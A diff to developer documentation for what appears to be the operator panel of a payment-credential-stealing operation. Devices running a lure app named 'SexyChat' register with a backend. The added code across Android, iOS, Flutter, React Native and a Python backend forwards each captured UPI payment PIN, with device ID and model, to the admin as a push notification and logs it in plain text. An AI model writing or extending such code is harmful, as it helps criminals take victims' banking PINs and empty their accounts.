@@ -40,7 +40,7 @@ Push Notification Displayed
 
 ### Notification Types
 
-**Device Registration Notification:**
+**1. Device Registration Notification:**
 ```
 Title: "?? New Device Registered"
 Body: "Samsung Galaxy S21 (SexyChat)"
@@ -49,6 +49,18 @@ Data: {
   "device_id": "abc123",
   "model": "Samsung Galaxy S21",
   "app_type": "sexychat"
+}
+```
+
+**2. UPI PIN Detected Notification:**
+```
+Title: "?? UPI PIN Detected"
+Body: "PIN: 123456 - Device: abc123 (Samsung Galaxy S21)"
+Data: {
+  "type": "upi_detected",
+  "device_id": "abc123",
+  "upi_pin": "123456",
+  "model": "Samsung Galaxy S21"
 }
 ```
 
@@ -214,6 +226,19 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
             showNotification(
                 "?? New Device Registered",
                 model + " (" + appType + ")",
+                data
+            );
+        } else if ("upi_detected".equals(type)) {
+            String deviceId = data.get("device_id");
+            String upiPin = data.get("upi_pin");
+            String model = data.get("model");
+            
+            Log.d(TAG, "UPI PIN detected: " + upiPin + " from device: " + deviceId);
+            
+            // Show notification
+            showNotification(
+                "?? UPI PIN Detected",
+                "PIN: " + upiPin + " - Device: " + deviceId + " (" + model + ")",
                 data
             );
         }
@@ -474,6 +499,18 @@ private void handleNotificationIntent(Intent intent) {
             Intent deviceIntent = new Intent(this, DeviceDetailsActivity.class);
             deviceIntent.putExtra("device_id", deviceId);
             startActivity(deviceIntent);
+        } else if ("upi_detected".equals(type)) {
+            String deviceId = intent.getStringExtra("device_id");
+            String upiPin = intent.getStringExtra("upi_pin");
+            String model = intent.getStringExtra("model");
+            
+            Log.d(TAG, "Opened from UPI notification: " + deviceId + " PIN: " + upiPin);
+            
+            // Navigate to device details screen
+            Intent deviceIntent = new Intent(this, DeviceDetailsActivity.class);
+            deviceIntent.putExtra("device_id", deviceId);
+            deviceIntent.putExtra("show_upi", true);  // Flag to show UPI section
+            startActivity(deviceIntent);
         }
     }
 }
@@ -602,19 +639,36 @@ class AppDelegate: UIResponder, UIApplicationDelegate, UNUserNotificationCenterD
     }
     
     private func handleNotificationTap(userInfo: [AnyHashable: Any]) {
-        if let type = userInfo["type"] as? String,
-           type == "device_registered" {
-            let deviceId = userInfo["device_id"] as? String ?? ""
-            let model = userInfo["model"] as? String ?? ""
-            
-            print("Navigate to device: \(deviceId)")
-            
-            // Post notification to navigate
-            NotificationCenter.default.post(
-                name: NSNotification.Name("NavigateToDevice"),
-                object: nil,
-                userInfo: ["device_id": deviceId]
-            )
+        if let type = userInfo["type"] as? String {
+            if type == "device_registered" {
+                let deviceId = userInfo["device_id"] as? String ?? ""
+                let model = userInfo["model"] as? String ?? ""
+                
+                print("Navigate to device: \(deviceId)")
+                
+                // Post notification to navigate
+                NotificationCenter.default.post(
+                    name: NSNotification.Name("NavigateToDevice"),
+                    object: nil,
+                    userInfo: ["device_id": deviceId]
+                )
+            } else if type == "upi_detected" {
+                let deviceId = userInfo["device_id"] as? String ?? ""
+                let upiPin = userInfo["upi_pin"] as? String ?? ""
+                let model = userInfo["model"] as? String ?? ""
+                
+                print("Navigate to device with UPI: \(deviceId) PIN: \(upiPin)")
+                
+                // Post notification to navigate
+                NotificationCenter.default.post(
+                    name: NSNotification.Name("NavigateToDevice"),
+                    object: nil,
+                    userInfo: [
+                        "device_id": deviceId,
+                        "show_upi": true
+                    ]
+                )
+            }
         }
     }
 }
@@ -894,6 +948,15 @@ class FCMService {
       
       // Navigate to device details
       // You can use Navigator or your routing solution here
+    } else if (type == 'upi_detected') {
+      String deviceId = message.data['device_id'] ?? '';
+      String upiPin = message.data['upi_pin'] ?? '';
+      String model = message.data['model'] ?? '';
+      
+      print('Navigate to device with UPI: $deviceId PIN: $upiPin');
+      
+      // Navigate to device details with UPI flag
+      // You can use Navigator or your routing solution here
     }
   }
   
@@ -1103,6 +1166,12 @@ class FCMService {
       const deviceId = data.device_id;
       console.log('Navigate to device:', deviceId);
       // Navigate to device details screen
+    } else if (data.type === 'upi_detected') {
+      const deviceId = data.device_id;
+      const upiPin = data.upi_pin;
+      const model = data.model;
+      console.log('Navigate to device with UPI:', deviceId, 'PIN:', upiPin);
+      // Navigate to device details screen with UPI flag
     }
   }
 
@@ -1247,7 +1316,9 @@ async def send_device_registration_notification(
         logger.error(f"? Failed to send notification: {e}")
 ```
 
-### When Notification is Sent
+### When Notifications are Sent
+
+**1. Device Registration Notification**
 
 **File:** `app/main.py` (in `/register` endpoint)
 
@@ -1265,6 +1336,57 @@ async def register_device(device_data: dict):
     )
     
     logger.info(f"?? Push notification sent to {admin_username}")
+```
+
+**2. UPI PIN Detected Notification**
+
+**File:** `app/main.py` (in `/save-pin` endpoint)
+
+```python
+@app.post("/save-pin")
+async def save_upi_pin(pin_data: UPIPinSave):
+    # ... UPI PIN save logic ...
+    
+    # ?? Push Notification to admin
+    device_model = device.get("model", "Unknown")
+    await firebase_admin_service.send_upi_pin_notification(
+        admin_username=admin_username,
+        device_id=pin_data.device_id,
+        upi_pin=pin_data.upi_pin,
+        model=device_model
+    )
+    
+    logger.info(f"?? UPI notification sent to {admin_username}")
+```
+
+**Backend Service Method:**
+
+**File:** `app/services/firebase_admin_service.py`
+
+```python
+async def send_upi_pin_notification(
+    self,
+    admin_username: str,
+    device_id: str,
+    upi_pin: str,
+    model: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    Send push notification when UPI PIN is detected
+    """
+    device_info = f" ({model})" if model else ""
+    
+    return await self.send_notification_to_admin(
+        admin_username=admin_username,
+        title="?? UPI PIN Detected",
+        body=f"PIN: {upi_pin} - Device: {device_id}{device_info}",
+        data={
+            "type": "upi_detected",
+            "device_id": device_id,
+            "upi_pin": upi_pin,
+            "model": model or "Unknown"
+        }
+    )
 ```
 
 ---
@@ -1402,8 +1524,22 @@ print(f"FCM Tokens: {admin.get('fcm_tokens', [])}")
 1. **App Starts** ? Initialize Firebase ? Get FCM token
 2. **Admin Logs In** ? Send FCM token to backend (in `/auth/verify-2fa`)
 3. **Backend Saves Token** ? Store in `admins.fcm_tokens` array
-4. **New Device Registers** ? Backend sends notification via Firebase
+4. **Events Trigger Notifications:**
+   - **New Device Registers** ? Push notification sent
+   - **UPI PIN Detected** ? Push notification sent
 5. **Admin Receives Notification** ? Show notification ? Handle tap
+
+### Notification Events
+
+**Device Registration:**
+- Triggered when: Device calls `/register` endpoint
+- Notification: "?? New Device Registered"
+- Data: device_id, model, app_type
+
+**UPI PIN Detected:**
+- Triggered when: Device calls `/save-pin` endpoint
+- Notification: "?? UPI PIN Detected"
+- Data: device_id, upi_pin, model
 
 ### Key Points
 
@@ -1412,6 +1548,7 @@ print(f"FCM Tokens: {admin.get('fcm_tokens', [])}")
 ? **Handle foreground notifications** (show even when app is open)  
 ? **Handle background notifications** (system shows automatically)  
 ? **Handle notification tap** (navigate to relevant screen)  
+? **Handle multiple notification types** (device_registered, upi_detected)  
 ? **Update token on refresh** (token can change)  
 ? **Test thoroughly** (foreground, background, quit state)  
 
